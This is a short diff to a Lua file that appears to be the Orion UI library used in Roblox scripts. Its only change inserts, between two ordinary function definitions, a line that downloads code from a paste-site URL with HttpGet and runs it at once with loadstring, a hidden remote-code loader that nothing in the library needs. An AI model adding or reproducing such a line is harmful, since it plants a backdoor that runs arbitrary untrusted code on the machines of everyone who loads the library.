@@ -1757,7 +1757,7 @@ function OrionLib:MakeWindow(WindowConfig)
 	
 	return TabFunction
 end   
-
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
